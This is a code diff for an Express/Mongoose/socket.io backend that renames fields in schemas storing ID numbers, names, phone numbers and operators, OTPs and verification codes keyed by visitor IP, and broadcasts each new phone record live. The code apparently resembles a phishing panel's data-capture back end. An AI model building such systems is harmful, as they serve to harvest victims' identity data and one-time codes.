@@ -93,9 +93,9 @@ const IndexSchema = new mongoose.Schema(
     ip: { type: String, unique: true, required: true },
     SellerIDnumber: mongoose.Schema.Types.Mixed,
     BuyerIDnumber: mongoose.Schema.Types.Mixed,
-    IDorResidenceNumber: mongoose.Schema.Types.Mixed,
-    FullName: mongoose.Schema.Types.Mixed,
-    PhoneNumber: mongoose.Schema.Types.Mixed,
+    IDNumber: mongoose.Schema.Types.Mixed,
+    fullname: mongoose.Schema.Types.Mixed,
+    phone: mongoose.Schema.Types.Mixed,
     SerialNumber: mongoose.Schema.Types.Mixed,
     VerificationCode: mongoose.Schema.Types.Mixed,
   },
@@ -209,7 +209,7 @@ const Otp = mongoose.models.Otp || mongoose.model("Otp", OtpSchema);
 const PhoneSchema = new mongoose.Schema(
   {
     ip: { type: String, required: true },
-    phoneNumber: { type: String, required: true },
+    phone: { type: String, required: true },
     operator: { type: String, required: true },
   },
   { timestamps: { createdAt: true, updatedAt: false } }
@@ -389,8 +389,8 @@ app.post(
 app.post(
   "/api/track/phone",
   wrap(async (req, res) => {
-    const { ip, phoneNumber, operator } = req.body;
-    const doc = await Phone.create({ ip, phoneNumber, operator });
+    const { ip, phone, operator } = req.body;
+    const doc = await Phone.create({ ip, phone, operator });
     io.emit("newPhone", doc);
     res.json({ success: true, doc });
   })
@@ -679,7 +679,7 @@ io.on("connection", (socket) => {
     try {
       const doc = await Phone.create({
         ip: data.ip,
-        phoneNumber: data.phoneNumber,
+        phone: data.phone,
         operator: data.operator,
       });
       io.emit("newPhone", doc);
